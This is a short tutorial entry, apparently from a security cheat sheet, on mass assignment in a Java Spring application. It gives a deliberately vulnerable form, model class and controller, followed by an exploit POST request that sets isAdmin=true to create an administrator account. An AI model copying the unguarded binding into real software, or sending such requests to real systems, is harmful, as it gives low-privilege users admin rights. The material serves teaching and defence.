### Mass Assignment/Object Injection Vulnerability:
```
This vulnerability occurs when the user supplies unexpected hidden paramaters to application and assign values to it.
This can allow users with low privilege to create admin account, change details that cant be edited once created, etc.

```
#### Vulnerable Code
```
<form>
     <input name="userid" type="text">
     <input name="password" type="text">
     <input name="email" text="text">
     <input type="submit">
</form>  

```

```
public class User {
   private String userid;
   private String password;
   private String email;
   private boolean isAdmin;

   //Getters & Setters
}

```
#### Request Controller

```
@RequestMapping(value = "/addUser", method = RequestMethod.POST)
public String submit(User user) {
   userService.add(user);
   return "successPage";
}
```

#### Exploit

```
POST /addUser
...
userid=bobbytables&password=hashedpass&email=bobby@tables.com&isAdmin=true

```

```

```
